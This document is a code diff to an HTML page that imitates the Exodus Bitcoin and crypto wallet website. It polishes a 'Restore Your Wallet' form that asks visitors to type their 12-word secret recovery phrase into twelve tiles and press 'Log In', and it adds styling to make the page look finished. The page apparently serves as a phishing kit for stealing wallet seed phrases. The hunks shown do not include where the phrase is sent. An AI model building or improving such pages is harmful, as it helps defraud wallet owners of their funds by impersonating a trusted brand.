@@ -29,7 +29,7 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
 /static/2fe75eac6750dec126c82ecfccb52c7e/f4534/header-bg-d.jpg 1366w,
 /static/2fe75eac6750dec126c82ecfccb52c7e/3832f/header-bg-d.jpg 1920w" alt="background"/></picture></noscript></div></div></div><header class="x__index-page__header"><div class="x__index-page__header__content">
 <h1 class="x__index-page__header__heading">Bitcoin and <br>Crypto Wallet</h1>
- <div class="login-form exodus__download__dropdow 
+ <div class="login-form exodus__download__dropdown
         </div>
         <h2>Restore Your Wallet</h2>
         <h4>Enter your 12-word secret phrase to import your existing wallet</h4>
@@ -38,51 +38,51 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
                 <!-- Creating 12 tiles -->
                 <div class="tile" id="tile1">
                     <span class="tile-title">1</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile2">
                     <span class="tile-title">2</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile3">
                     <span class="tile-title">3</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile4">
                     <span class="tile-title">4</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile5">
                     <span class="tile-title">5</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile6">
                     <span class="tile-title">6</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile7">
                     <span class="tile-title">7</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile8">
                     <span class="tile-title">8</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile9">
                     <span class="tile-title">9</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile10">
                     <span class="tile-title">10</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile11">
                     <span class="tile-title">11</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
                 <div class="tile" id="tile12">
                     <span class="tile-title">12</span>
-                    <input type="text" placeholder="">
+                    <input type="text" placeholder="Enter word">
                 </div>
             </div>
             <button class="x__button-default x__button-default--normal x__button-default--primary" type="submit">Log In</button>
@@ -113,8 +113,91 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         });
     </script>
 </div></header>
+<style>
+    body {
+        background-color: #121212;
+        color: #ffffff;
+        font-family: Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
 
+    .x__index-page__header {
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
 
+    .x__index-page__header__logo img {
+        width: 150px;
+    }
+
+    .x__index-page__header__content {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+
+    .login-form {
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 80%;
+        text-align: center;
+        margin-bottom: 30px;
+    }
+
+    .container {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+        width: 100%;
+        margin-top: 20px;
+    }
+
+    .tile {
+        background-color: #1e1e1e;
+        border: 2px solid #333;
+        border-radius: 8px;
+        padding: 20px;
+        text-align: left;
+        position: relative;
+    }
+
+    .tile-title {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        font-weight: bold;
+    }
+
+    input[type="text"] {
+        width: 100%;
+        padding: 10px;
+        margin-top: 30px;
+        border: none;
+        border-radius: 4px;
+        background-color: #333;
+        color: #ffffff;
+    }
+
+    button.x__button-default {
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        margin-top: 20px;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+    }
+                 </style>
 
     </body>
 </html>
